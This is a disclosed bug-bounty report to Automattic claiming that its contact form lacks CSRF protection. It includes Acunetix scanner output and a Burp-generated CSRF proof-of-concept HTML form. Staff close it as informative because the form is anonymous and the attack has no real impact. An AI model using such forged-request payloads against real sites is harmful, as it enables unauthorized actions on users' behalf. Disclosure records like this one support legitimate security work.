{"id":7849,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODQ5","url":"https://hackerone.com/reports/7849","title":"HTML form without CSRF protection","state":"Closed","substate":"informative","readable_substate":"Informative","created_at":"2014-04-17T16:43:05.326Z","submitted_at":"2014-04-17T16:43:05.326Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"0xsaikiran","url":"/0xsaikiran","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/607/b0693aad94cb88acbb4add78b330dbc77f7e06bc_original.JPG/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":111,"url":"https://hackerone.com/automattic","handle":"automattic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Automattic","twitter_handle":"","website":"https://automattic.com","about":"WordPress.com, VaultPress, Akismet, Gravatar, WooCommerce, Polldaddy, Tumblr and more!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2014-07-08T10:00:27.595Z","bug_reporter_agreed_on_going_public_at":"2014-05-30T10:23:54.003Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"\r\nHTML form without CSRF protection\r\n\r\nVulnerability description\r\nCross-site request forgery, also known as a one-click attack or session riding and abbreviated as CSRF or XSRF, is a type of malicious exploit of a website whereby unauthorized commands are transmitted from a user that the website trusts.\r\n\r\nThis vulnerability affects /contact. \r\n\r\nAttack details\r\nForm action: http://automattic.com/contact/\r\nForm method: POST\r\n\r\nForm inputs:\r\n\r\nyour_name [Text]\r\nyour_email [Text]\r\nblog_url [Text]\r\nsubject [Text]\r\nmessage [TextArea]\r\nsubmit [Submit]\r\n\r\n\r\n View HTTP headers \r\nRequest\r\nGET /contact/ HTTP/1.1\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nReferer: http://automattic.com/contact/\r\nAcunetix-Aspect: enabled\r\nAcunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c\r\nAcunetix-Aspect-Queries: filelist;aspectalerts\r\nHost: automattic.com\r\nConnection: Keep-alive\r\nAccept-Encoding: gzip,deflate\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36\r\nAccept: */*\r\n\r\nResponse\r\nHTTP/1.1 200 OK\r\nServer: nginx\r\nDate: Thu, 17 Apr 2014 16:08:47 GMT\r\nContent-Type: text/html; charset=UTF-8\r\nConnection: keep-alive\r\nVary: Accept-Encoding\r\nLast-Modified: Thu, 17 Apr 2014 16:08:19 GMT\r\nCache-Control: max-age=272, must-revalidate\r\nX-nananana: Batcache\r\nVary: Cookie\r\nX-hacker: If you're reading this, you should visit automattic.com/jobs and apply to join the fun, mention this header.\r\nX-Pingback: http://automattic.com/xmlrpc.php\r\nLink: \u003chttp://wp.me/Pe4R-7\u003e; rel=shortlink\r\nOriginal-Content-Encoding: gzip\r\nContent-Length: 16613\r\n View HTML response \r\n Launch the attack with HTTP Editor  Retest alert(s)  Mark this alert as a false positive \r\nThe impact of this vulnerability\r\nAn attacker may force the users of a web application to execute actions of the attacker's choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application.\r\n\r\nHow to fix this vulnerability\r\nCheck if this form requires CSRF protection and implement CSRF countermeasures if necessary.\r\n\r\npoc-\r\n\u003chtml\u003e\r\n  \u003c!-- CSRF PoC - generated by Burp Suite Professional --\u003e\r\n  \u003cbody\u003e\r\n    \u003cform action=\"http://automattic.com/contact/\" method=\"POST\"\u003e\r\n      \u003cinput type=\"hidden\" name=\"your\u0026#95;name\" value=\"saddsa\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"your\u0026#95;email\" value=\"sdasad\u0026#64;sg\u0026#46;com\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"blog\u0026#95;url\" value=\"http\u0026#58;\u0026#47;\u0026#47;www\u0026#46;google\u0026#46;co\u0026#46;in\u0026#47;\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"subject\" value=\"sadsa\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"message\" value=\"hello\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"submit\" value=\"Send\" /\u003e\r\n      \u003cinput type=\"submit\" value=\"Submit form\" /\u003e\r\n    \u003c/form\u003e\r\n  \u003c/body\u003e\r\n\u003c/html\u003e\r\n\r\n","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2014-06-28T14:46:26.245Z","allow_singular_disclosure_after":-229999256.57132795,"singular_disclosure_allowed":true,"vote_count":2,"voters":["ali","robdollard"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":32139,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi there. Thanks for reporting, but I'm not sure there's really a security issue here. Forms can even be submitted anonymously, so unless I'm missing something, there's no ability to gain elevated privilege here and thus no exploit vector. If I'm misunderstanding, I'd be grateful for clarification. ","automated_response":false,"created_at":"2014-04-17T21:05:45.141Z","updated_at":"2014-04-17T21:05:45.141Z","actor":{"username":"dllh","cleared":false,"url":"/dllh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":32558,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"yeah just making u aware of dat issue...so dat u make it more secure...by chance later on if u update the page with important info and forget to put csrf protection ...it may happn","automated_response":false,"created_at":"2014-04-18T11:59:21.001Z","updated_at":"2014-04-18T11:59:21.001Z","actor":{"username":"0xsaikiran","cleared":false,"url":"/0xsaikiran","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/607/b0693aad94cb88acbb4add78b330dbc77f7e06bc_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":61045,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Thanks for the report. As mentioned earlier, there is no data related to the current user (thus no user impersonation) being used in this contact form.","automated_response":false,"created_at":"2014-05-29T14:46:26.280Z","updated_at":"2014-05-29T14:46:26.280Z","actor":{"username":"xknown","cleared":false,"url":"/xknown","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":61879,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2014-05-30T10:23:54.022Z","updated_at":"2014-05-30T10:23:54.022Z","actor":{"username":"0xsaikiran","cleared":false,"url":"/0xsaikiran","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/607/b0693aad94cb88acbb4add78b330dbc77f7e06bc_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":85907,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2014-07-08T10:00:27.605Z","updated_at":"2014-07-08T10:00:27.605Z","actor":{"url":"/automattic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Automattic"}},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}